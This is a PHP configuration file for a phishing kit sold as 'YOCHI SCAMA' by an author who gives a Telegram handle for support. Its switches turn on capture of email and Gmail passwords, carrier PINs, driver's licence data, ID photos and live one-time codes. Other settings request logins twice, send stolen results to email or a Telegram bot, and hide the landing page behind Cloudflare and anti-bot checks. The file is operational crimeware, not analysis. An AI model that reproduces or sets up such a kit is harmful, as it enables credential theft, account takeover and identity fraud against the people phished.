<?php
###########################################################################################################
# <------- YOCHI SCAMA CONFIGURATION FILE <></>
/*
TOGGLE ON / OFF:
1 : ENABLE.
0 : DISABLE.
USE 1 OR 0 to SET FEATURES ON OR OFF*/

$mobileonly=0;                     # <--- BLOCK ALL DEVICES THAT ARE NOT MOBILE
$usecaution=1;                     # <--- INDICATE WHETHER YOU WANT TO USE CAUTION OR NOT	
$ftpsave=0;                        # <--- SAVE RESULTS ON SCAMAHOMEFOLDER/rst/.....
$sendtoemail=0;                    # <--- SEND RESULTS TO EMAIL
$sendtotg=0;                       # <--- SEND RESULTS TO TELEGRAM
$cloudflarelanding=1;              # <--- USE CLOUDFLARE FOR LANDING PAGE
$grabemailaccess=1;                # <--- (ON/OFF) Email access grab
$grabgmail=1;                      # <--- (ON/OFF) GRAB GMAIL PASS
$grabcpin=1;                       # <--- GRAB CARRIER PIN
$grabdl=1;                         # <--- GRAB DL INFO IN FULLZ PAGE
$grabidphoto=1;                    # <--- GRAB PHOTO OF DL OR ANY OTHER GOV. ID
$grabotp=1;                        # <--- GRAB LOGGING OTP (INCLUDES LOADING DELAY FOR YOU TO LOGIN AND SEND CODE)
$doubleloginentry=1;               # <--- REQUEST TWICE FOR LOGIN DETAILS
$confirmemaillog=1;                # <--- REQUEST TWICE FOR EMAIL ACCESS DETAILS
$useantibots=0;                    # <--- (ON/OFF) Antibots
$send = "youremail@domain.yes,";   # <--- YOUR EMAIL/EMAILS SEPARATED BY COMMAS
$tgbot = "Your BOT TOKEN";         # <--- YOUR TELEGRAM BOT TOKEN WITHOUT "bot" AS PREFIX
$chatid = "CHAT_ID";               # <--- YOUR TELEGRAM CHAT ID
$resultheading = "🎌 YOCHI 🎌";      # <--- WHAT YOUR RESULTS SHOULD DISPLAY AS TOP 
$adminpanel = 1;                   # <--- ENABLE ADMIN PANEL
$adminpass = "";                   # <--- YOUR PASSWORD TO VIEW ADMIN PANEL
// goto yourdomain.com/admin/index.php to track visiting activity
/*  ___      ___      _______  __
    \  \    /  /     /  _____||  |
     \  \  /  /	    /  /      |  |
      \  \/  /	   |  |	      |  |___    O
       \    /____  |  |       |   ___ \	 _
        |  |/_ _ \ |  |       |  |   \ || |
        |  | o_o  | \  \____  |  |   | || |
        |__|\____/   \______| |__|   | ||_|      grrrr
	Telegram : @yo_chi
	If you experience any issues or for upgrade
									   */
?>